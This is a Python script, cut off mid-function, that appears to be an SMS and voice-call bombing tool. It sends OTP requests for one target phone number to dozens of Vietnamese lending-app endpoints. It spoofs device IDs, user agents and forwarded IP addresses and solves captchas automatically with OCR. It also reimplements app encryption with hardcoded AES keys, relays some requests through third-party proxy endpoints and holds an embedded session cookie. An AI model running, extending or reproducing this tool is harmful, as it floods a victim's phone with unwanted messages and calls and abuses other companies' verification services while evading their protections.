import sys
import os
import secrets
import random
import httpx
import asyncio
import time
import gc
import uuid
import hashlib
from datetime import datetime, timedelta
import json
import base64
import io
from typing import Optional, Dict, Tuple
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import ImageFile, Image
import ddddocr
ImageFile.LOAD_TRUNCATED_IMAGES = True
_ocr = ddddocr.DdddOcr(show_ad=False)

def build_headers(origin, mode="ios"):
    devices = [
        "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
        "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro",
        "Redmi K70", "POCO X6 Pro",
        "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
        "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
        "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
        "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
        "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
    ]
    android_versions = ["11", "12", "13", "14", "15"]
    device = random.choice(devices)
    return {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8",
        "content-type": "application/json",
        "x-client-type": "phone",
        "origin": origin,
        "referer": origin + "/",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {device})",
        "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Language": random.choice(["vi-VN", "en-US"]),
        "Accept-Encoding": "gzip"
    }

def _random_android_id() -> str:
    return ''.join(random.choices('0123456789abcdef', k=32))

def gen_device_id():
    return str(uuid.uuid4()).upper()

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def get_random_ipv6():
    parts = []
    for _ in range(8):
        part = format(random.randint(0, 65535), 'x')
        parts.append(part)
    return ':'.join(parts)

_VNCREDIT_KEY = b'tdbdif7653scbvy4'

def _vncredit_encrypt(data: dict) -> dict:
    raw = json.dumps(data, separators=(',', ':')).encode()
    cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
    enc = base64.b64encode(cipher.encrypt(pad(raw, 16))).decode()
    return {"JXTbpertIbc": enc}

def _vncredit_decrypt(resp_json: dict) -> dict:
    try:
        enc = resp_json.get("JXTbpertIbc", "")
        raw = base64.b64decode(enc)
        cipher = AES.new(_VNCREDIT_KEY, AES.MODE_ECB)
        return json.loads(unpad(cipher.decrypt(raw), 16).decode())
    except Exception:
        return resp_json

_VNCREDIT_DEVICE_IDS: dict = {}

def _vncredit_device_id(phone_otp: str) -> str:
    if phone_otp not in _VNCREDIT_DEVICE_IDS:
        _VNCREDIT_DEVICE_IDS[phone_otp] = str(random.randint(10000000, 99999999))
    return _VNCREDIT_DEVICE_IDS[phone_otp]

_QQ_BASE      = "https://ang.quickquangapp.com"
_QQ_OWNERSHIP = "quiquang_ios"

def _qq_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _QQ_OWNERSHIP,
        "Origin":        _QQ_BASE,
        "Referer":       _QQ_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _qq_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.1.0",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _QQ_OWNERSHIP,
        "token":           "",
        **extra,
    }

def _qq_solve(b64_str: str) -> str:
    try:
        raw = base64.b64decode(b64_str)
        img = Image.open(io.BytesIO(raw))
        img.load()
        buf_color = io.BytesIO()
        img.convert("RGB").save(buf_color, format="PNG")
        result = _ocr.classification(buf_color.getvalue())
        if result and result.strip():
            return result.strip()
        from PIL import ImageEnhance
        enhanced = ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0)
        buf_enh = io.BytesIO()
        enhanced.save(buf_enh, format="PNG")
        result2 = _ocr.classification(buf_enh.getvalue())
        return result2.strip() if result2 else ""
    except Exception:
        return ""

async def _qq_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_QQ_BASE}{endpoint}",
                headers=_qq_headers(),
                json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def qq_sms(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")

async def qq_voice(phone_otp: str):
    await _qq_send(phone_otp, "/base/xmh/getVoiceCode", "QQ Voice")

_PTV_BASE      = "https://app.phuthinhvay.com"
_PTV_OWNERSHIP = "PTVayNhanh_ios"

def _ptv_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encrypttype":   "0",
        "disturbedurl":  "0",
        "disturbedpar":  "0",
        "ownership":     _PTV_OWNERSHIP,
        "User-Agent":    "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _ptv_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _PTV_OWNERSHIP,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        "phoneNo":     phone_otp,
        **extra,
    }

async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get(cap_key, "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_PTV_BASE}{endpoint}",
                headers=_ptv_headers(),
                json=_ptv_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def ptvay_sms(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")

async def ptvay_voice(phone_otp: str):
    await _ptv_send(phone_otp, "/lvjKRH/brRsY/getVoiceCode", "captcha", "PTVay Voice")

_LAVI_BASE      = "http://tin.lavifinancecompany.com"
_LAVI_OWNERSHIP = "laviFinance_ios"

def _lavi_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "ownerShip":     _LAVI_OWNERSHIP,
        "User-Agent":    "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0",
    }

def _lavi_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":        "vi_VN",
        "reqSource":   "Ios",
        "phoneName":   "iPhone13,3",
        "appVersion":  "1.1.0",
        "ownerShip":   _LAVI_OWNERSHIP,
        "phoneNo":     phone_otp,
        "veriType":    "LOGIN",
        "figureVeri":  False,
        **extra,
    }

async def _lavi_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_LAVI_BASE}{endpoint}",
                headers=_lavi_headers(),
                json=_lavi_body(phone_otp, {"figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def lavi_sms(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")

async def lavi_voice(phone_otp: str):
    await _lavi_send(phone_otp, "/base/xmh/getVoiceCode", "Lavi Voice")

_ACHAU_BASE      = "https://tien.achauloan.com"
_ACHAU_OWNERSHIP = "AChauLoan_ios"

def _achau_headers() -> dict:
    return {
        "Accept":          "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type":    "application/json",
        "Connection":      "keep-alive",
        "User-Agent":      "vetnam_xingxing_01/5 CFNetwork/1568.200.51 Darwin/24.1.0",
        "disturbedurl":    "0",
        "encrypttype":     "1",
        "encrypted":       "0",
        "disturbedpar":    "1",
        "ownership":       _ACHAU_OWNERSHIP,
    }

def _achau_body(phone_otp: str, extra: dict) -> dict:
    return {
        "reqSource":      "Ios",
        "phoneName":      "iPhone",
        "appVersion":     "1.2.8",
        "androidversion": "iOS 18.1",
        "deviceID":       str(uuid.uuid4()).upper(),
        "i18n":           "zh_CN",
        "phoneNo":        phone_otp,
        "veriType":       "LOGIN",
        **extra,
    }

async def _achau_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            code1 = str(d1.get("code", ""))
            if code1 == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            if code1 == "106":
                print(f" ⚠️  {label} code 106 — số đã kích hoạt bảo mật 2 lớp, bỏ qua")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={code1} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_ACHAU_BASE}{endpoint}",
                headers=_achau_headers(),
                json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            code2 = str(d2.get("code", ""))
            if code2 == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            elif code2 == "106":
                print(f" ⚠️  {label} code 106 sau captcha — số đã bật bảo mật 2 lớp")
            else:
                print(f" ✘ {label} step2 [{answer}] code={code2} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def achau_sms(phone_otp: str):
    await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")

_HTC_BASE      = "https://tin.hatacocompany.com"
_HTC_OWNERSHIP = "hatacovay_ios"

def _htc_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _HTC_OWNERSHIP,
        "Origin":        _HTC_BASE,
        "Referer":       _HTC_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _htc_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":            "vi_VN",
        "reqSource":       "Ios",
        "phoneName":       "iPhone13,3",
        "appVersion":      "1.0.2",
        "androidversion":  "iOS18.1",
        "webVersion":      "1.0.0",
        "deviceID":        str(uuid.uuid4()).upper(),
        "uuid":            uuid.uuid4().hex,
        "pagingData":      0,
        "exquisiteItemType": 1,
        "ownerShip":       _HTC_OWNERSHIP,
        "token":           "",
        **extra,
    }

async def _htc_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as c:
            r1 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": False}),
            )
            d1 = r1.json()
            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
                return
            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                return
            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} OCR fail")
                return
            r2 = await c.post(
                f"{_HTC_BASE}{endpoint}",
                headers=_htc_headers(),
                json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
            )
            d2 = r2.json()
            if str(d2.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
            else:
                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
    except Exception as e:
        print(f" ✘ {label} exception: {e}")

async def htc_sms(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getSMSCode", "HTC SMS")

async def htc_voice(phone_otp: str):
    await _htc_send(phone_otp, "/base/xmh/getVoiceCode", "HTC Voice")

_PETRO_BASE      = "https://loan.gpamcloan.com"
_PETRO_OWNERSHIP = "GPAMCloan_ios"

def _petro_headers() -> dict:
    return {
        "Content-Type":  "application/json",
        "Accept":        "application/json, text/plain, */*",
        "encrypted":     "0",
        "encryptType":   "0",
        "disturbedUrl":  "1",
        "disturbedPar":  "1",
        "ownerShip":     _PETRO_OWNERSHIP,
        "Origin":        _PETRO_BASE,
        "Referer":       _PETRO_BASE + "/",
        "User-Agent":    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
                         "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    }

def _petro_body(phone_otp: str, extra: dict) -> dict:
    return {
        "i18n":              "vi_VN",
        "reqSource":         "Ios",
        "phoneName":         "iPhone13,3",
        "appVersion":        "1.1.0",
        "androidversion":    "iOS18.1",
        "webVersion":        "1.0.0",
        "deviceID":          str(uuid.uuid4()).upper(),
        "uuid":              uuid.uuid4().hex,
        "pagingData":        0,
        "phoneNo":           phone_otp,
        "exquisiteItemType": 1,
        "ownerShip":         _PETRO_OWNERSHIP,
        "token":             "",
        **extra,
    }

async def _petro_send(phone_otp: str, endpoint: str, label: str):
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True, http2=True) as c:
            r1 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False})
            )
            try:
                d1 = r1.json()
            except Exception:
                print(f" ✘ {label} invalid json #1")
                return

            if str(d1.get("code", "")) == "0":
                print(f" ✅ {label} {phone_otp} {d1.get('message', '')}")
                return

            cap_b64 = (d1.get("data") or {}).get("captcha", "")
            if not cap_b64:
                print(f" ✘ {label} no captcha")
                return

            answer = _qq_solve(cap_b64)
            if not answer:
                print(f" ✘ {label} captcha solve fail")
                return

            r2 = await c.post(
                f"{_PETRO_BASE}{endpoint}",
                headers=_petro_headers(),
                json=_petro_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer})
            )

            try:
                d2 = r2.json()
            except Exception:
                print(f" ✘ {label} invalid json #2")
                return

            ok = str(d2.get("code", "")) == "0"
            if ok:
                print(f" ✅ {label} {phone_otp} [{answer}] {d2.get('message', '')}")
            else:
                print(f" ✘ {label} {phone_otp} [{answer}] {d2}")
    except Exception as e:
        pass

async def petro_sms(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getSMSCode", "Petro SMS")

async def petro_voice(phone_otp: str):
    await _petro_send(phone_otp, "/base/xmh/getVoiceCode", "Petro Voice")

def _vncredit_headers(phone_otp: str) -> dict:
    return {
        "Content-Type": "application/json",
        "arHZCqdXMe": "",
        "DJDVItHEOpT": "",
        "TcJSztVvHI": "in",
        "vMdkYlySgyVn": "cn.ivay.h5.viet",
        "BCCpGTCULBU": _vncredit_device_id(phone_otp),
        "xAfAyxfEVv": "",
        "oqBfkSWOjSw": "1",
        "fbcId": "",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ),
    }

async def vncredit_sms(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit SMS  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def vncredit_voice(phone_otp):
    try:
        headers = _vncredit_headers(phone_otp)
        async with httpx.AsyncClient() as client:
            r = await client.post(
                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
                json={"mobile": phone_otp, "type": "1"}, headers=headers, timeout=20,
            )
        if r.status_code == 200:
            resp = _vncredit_decrypt(r.json())
            ok = resp.get("code") == 0
            if ok:
                print(f" ✅ VNCredit Voice  {resp.get('msg', '')}")
            return ok
        return False
    except Exception as e:
        return False

async def random_site(phone_otp):
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://doaxa--e3c9c6644c9c11f1b16dee650bb23af1.web.val.run",
            headers={"Content-Type": "application/json"},
            json={"phone": phone_otp}
        )

async def call_mfast360(phone_otp):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    }
    payload = {
        "mobile_phone": phone_otp,
        "type": "call",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://asia-south1-mfast-360-prod.cloudfunctions.net/api/auth/sendOtp",
            json=payload,
            headers=headers
        )

async def call_vaydep365(phone_otp: str):
    CF_URL = [
        "https://ndnndfndndbb--28fa0824520211f1b766ee650bb23af1.web.val.run",
        "https://wander6fb5.xadoa8.workers.dev/vaydep365",
        "https://verceldeploy-one-phi.vercel.app/api/vaydep",
    ]
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(
                random.choice(CF_URL),
                json={"phone": phone_otp},
            )
        print(f"  vaydep365_valtown | {r.status_code} | {r.text[:200]}")
        return r.json()
    except Exception as e:
        return None

async def call_senvay(phone_otp):
    KEY   = b"43frgy5fmjf4647f"
    NONCE = b"\x00" * 12

    def enc(plain):
        if isinstance(plain, (dict, list)):
            plain = json.dumps(plain, separators=(",", ":")).encode()
        elif isinstance(plain, str):
            plain = plain.encode()
        ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=NONCE).encrypt_and_digest(plain)
        return base64.b64encode(NONCE + ct + tag).decode()

    def make_token(device_no: str, server_time_ms: int) -> str:
        inner_token = enc(f"{device_no}++1")
        return enc(f"{inner_token}+{server_time_ms}")

    def make_headers(token: str) -> dict:
        return {
            "Accept":          "application/json, text/plain, */*",
            "Content-Type":    "application/json",
            "version":         "1.0.0",
            "countryCode":     "vn",
            "type":            "1060",
            "token":           token,
            "Origin":          "https://senvayvaytien.com",
            "Referer":         "https://senvayvaytien.com/login",
            "User-Agent":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
        }

    device_no = str(uuid.uuid4())
    base_url  = "https://senvayvaytien.com/ly03"
    try:
        async with httpx.AsyncClient(verify=False, timeout=30) as client:
            init_path  = "/encrypt/k/bla/j"
            init_param = {
                "fndkec": "vn",
                "ffkjno": "1060",
                "fniehh": "1.0.0",
                "falgnk": 1,
                "fajnpo": "",
                "fnjhhd": device_no,
            }
            local_before  = int(time.time() * 1000)
            init_token    = make_token(device_no, local_before)
            init_body     = enc({"param": enc(init_param), "url": enc(init_path)})
            r = await client.post(
                f"{base_url}{init_path}",
                content=init_body.encode(),
                headers=make_headers(init_token),
            )
            server_time_ms = local_before
            if r.status_code == 200:
                try:
                    init_data = r.json()
                    result    = init_data.get("result") or {}
                    sv = result.get("ffolml")
                    if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
                        server_time_ms = int(sv)
                except Exception:
                    pass
            sms_path  = "/fm/nkgg/edf"
            phone_fmt = "840" + phone_otp.lstrip("0")
            sms_param = {
                "ffchmk": "vn",
                "fahpgp": "1060",
                "fmland": "1.0.0",
                "fbdcbg": phone_fmt,
                "fpkgam": 2,
                "fojphg": 1,
            }
            sms_token = make_token(device_no, server_time_ms)
            sms_body  = enc({"param": enc(sms_param), "url": enc(sms_path)})
            r = await client.post(
                f"{base_url}{sms_path}",
                content=sms_body.encode(),
                headers=make_headers(sms_token)
            )
        return r.status_code == 200
    except Exception as e:
        return False

async def call1(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://ezvay.com",
            "Referer": "https://ezvay.com/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "vay_home"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://ezvay.com/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "vay_home"
            }
            r2 = await client.post(
                "https://ezvay.com/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )

        return True
    except:
        return False

async def call2(phone_otp):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://vaycash.top",
            "Referer": "https://vaycash.top/",
            "language": "vi_VN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        payload_1 = {
            "smsType": "1",
            "phone": phone_otp,
            "loanProductName": "u_cash"
        }
        async with httpx.AsyncClient() as client:
            r1 = await client.post(
                "https://vaycash.top/app-domain/api/user/sentSms",
                headers=headers,
                json=payload_1
            )
            payload_2 = {
                "type": 2,
                "productName": "u_cash"
            }
            r2 = await client.post(
                "https://vaycash.top/app-domain/api/user/appCollectUpload",
                headers=headers,
                json=payload_2
            )

        return True
    except:
        return False

async def call3(phone_otp):
    phone_formatted = phone_otp.lstrip('0')
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted,
        "type": "2",
        "chntoken": "",
        "sourse": "1",
        "ip2": get_random_ip(),
        "ip3": get_random_ipv6()
    }
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post(url, headers=headers, data=data)

    except:
        return False

async def call9(phone_otp):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp_get = await client.get(
                "https://lk.vayxanh.com/",
                params={"phone": phone_otp, "amount": "2000000", "term": "7",
                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
                headers=headers_get,
            )
            r = await client.post(
                "https://lk.vayxanh.com/api/4/client/otp/send",
                headers=headers_post,
                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
            )

        print(r.text)
    except:
        return False

async def call_hoivan(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "app_id": "247000001"},
            headers=headers
        )

async def call_hoivan_okay(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "247000000"},
            headers=headers
        )

async def mfast(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://mfast.vn",
        "Referer": "https://mfast.vn/",
        "language": "vi_VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
    }
    data = {
        "phone": phone_otp,
        "type": "phone",
    }
    async with httpx.AsyncClient(timeout=10) as client:
        r = await client.post(
            "https://appay-rc.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone",
            headers=headers,
            data=data,
        )


async def combo1(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload1 = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "ios",
